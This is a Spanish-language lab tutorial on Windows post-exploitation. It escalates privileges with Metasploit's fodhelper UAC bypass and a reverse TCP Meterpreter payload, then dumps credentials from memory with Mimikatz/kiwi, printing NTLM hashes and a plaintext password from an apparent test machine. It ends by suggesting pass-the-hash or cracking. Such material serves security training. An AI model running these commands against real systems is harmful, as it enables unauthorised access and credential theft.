# Volcado de memoria con Mimikatz

De las herramientas mas famosas para las `Post-Explotacion` en `Windows` es la deminada `Mimikatz`, es una herramienta la cual tiene muchas funciones para dumpear `hashes`, contraseñas, crear claves, etc...

Podemos encontrar mas informacion en el siguiente link:

URL = [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz/tree/master)

Lo que primero haremos sera comprometer la maquina `windows` teniendo un `meterpreter` desde `metasploit`, lo podremos hacer como en las anteriores veces con el modulo `web_delivery`, una vez que obtengamos una shell, haremos lo siguiente.

Vamos a escalar privilegios `bypasseando` el `UAC` como hicimos anteriormente.

```shell
use windows/local/bypassuac_fodhelper
```

La configuracion:

```shell
set session 1
set target 1
set LHOST <IP>
set LPORT 5555
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Info:

```
*] Started reverse TCP handler on 192.168.5.186:5555 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\system32\cmd.exe /c C:\Windows\System32\fodhelper.exe
[*] Sending stage (201798 bytes) to 192.168.5.181
[*] Cleaining up registry keys ...
[*] Meterpreter session 2 opened (192.168.5.186:5555 -> 192.168.5.181:49778) at 2024-11-22 04:08:21 -0500

meterpreter >
```

Ahora lo que vamos hacer es cargar `mimikatz` con el siguiente comando:

```shell
load kiwi
```

Y con `help kiwi` podremos ver todos los comandos.

```
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

Antes haremos un `getsystem` para ser administradores.

Si nosotros ponemos lo siguiente para que nos vuelque todas las credenciales que encuentre en memoria:

```shell
creds_all
```

Info:

```
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain           NTLM                              SHA1                                      DPAPI
--------  ------           ----                              ----                                      -----
d1se0     DESKTOP-EALA4JN  b1f702c125f162ed66636c7d825429e2  e61017f4322524b60e6c7bfcfd25adfeb2bd56b9  e61017f4322524b60e6c7bfcfd25adfe

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
DESKTOP-EALA4JN$  WORKGROUP        (null)
d1se0             DESKTOP-EALA4JN  (null)

kerberos credentials
====================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
d1se0             DESKTOP-EALA4JN  (null)
desktop-eala4jn$  WORKGROUP        (null)
```

Podremos ver que en concreto saco las credenciales (`hash`) de un usuario llamado `d1se0`, pero tampoco nos sirve mucho ya que no tenemos credenciales en `texto plano`.

Ahora vamos a utilizar el lenguaje nativo de `mimikatz` para dumpear las contraseñas que estan injectadas en memoria de la siguiente forma:

```shell
kiwi_cmd sekurlsa::logonPasswords
```

Info:

```
Authentication Id : 0 ; 243358 (00000000:0003b69e)
Session           : Interactive from 1
User Name         : d1se0
Domain            : DESKTOP-EALA4JN
Logon Server      : DESKTOP-EALA4JN
Logon Time        : 22/11/2024 9:56:18
SID               : S-1-5-21-1577662185-671283546-3547771585-1001
        msv :
         [00000003] Primary
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * NTLM     : b1f702c125f162ed66636c7d825429e2
         * SHA1     : e61017f4322524b60e6c7bfcfd25adfeb2bd56b9
         * DPAPI    : e61017f4322524b60e6c7bfcfd25adfe
        tspkg :
        wdigest :
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * Password : (null)
        kerberos :
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : d1se0
         * Domain   : 192.168.5.182
         * Password : diseo
        cloudap :

Authentication Id : 0 ; 243254 (00000000:0003b636)
Session           : Interactive from 1
User Name         : d1se0
Domain            : DESKTOP-EALA4JN
Logon Server      : DESKTOP-EALA4JN
Logon Time        : 22/11/2024 9:56:18
SID               : S-1-5-21-1577662185-671283546-3547771585-1001
        msv :
         [00000003] Primary
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * NTLM     : b1f702c125f162ed66636c7d825429e2
         * SHA1     : e61017f4322524b60e6c7bfcfd25adfeb2bd56b9
         * DPAPI    : e61017f4322524b60e6c7bfcfd25adfe
        tspkg :
        wdigest :
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * Password : (null)
        kerberos :
         * Username : d1se0
         * Domain   : DESKTOP-EALA4JN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : d1se0
         * Domain   : 192.168.5.182
         * Password : diseo
        cloudap :

Authentication Id : 0 ; 76593 (00000000:00012b31)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 76553 (00000000:00012b09)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : SERVICIO LOCAL
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-EALA4JN$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-eala4jn$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50797 (00000000:0000c66d)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50798 (00000000:0000c66e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 49876 (00000000:0000c2d4)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-EALA4JN$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 22/11/2024 9:56:12
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-EALA4JN$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-eala4jn$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Y como vemos en esta seccion:

```
ssp :
        credman :
         [00000000]
         * Username : d1se0
         * Domain   : 192.168.5.182
         * Password : diseo
        cloudap :
```

Nos esta dando la contraseña en texto plano del usuario `d1se0`.

En tal caso de que a lo mejor solo obtuvieramos los `hashes` `NTLM` se podria hacer un `Pass-The-Hash` con dicho `hash` para autenticarte como dicho usuario sin saber su contraseña y aunque se cambie la contraseña podras seguir pudiendo autenticarte, o tambien se puede intentar crackear el `hash` de forma que te de la contraseña en `texto plano`.
